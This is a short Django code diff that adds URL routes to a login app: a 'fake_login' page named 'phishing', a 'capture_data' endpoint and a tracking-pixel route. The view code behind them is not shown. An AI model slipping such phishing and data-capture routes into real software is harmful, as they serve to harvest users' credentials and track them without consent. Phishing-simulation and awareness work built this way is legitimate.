@@ -5,6 +5,11 @@ from django.contrib.auth import views as auth_views
 urlpatterns = [
     path("", views.register, name="register"),
     path("login/", views.login_view, name="login"),
+
+    path('fake_login/', views.fake_login, name='phishing'),
+    path('capture_data/', views.capture_data),
+    path('trackingpixel.png', views.track_pixel),
+
     path("login/otp", views.opt, name="otp"),
     path('captcha/', include('captcha.urls')),
     path('reset_password/',
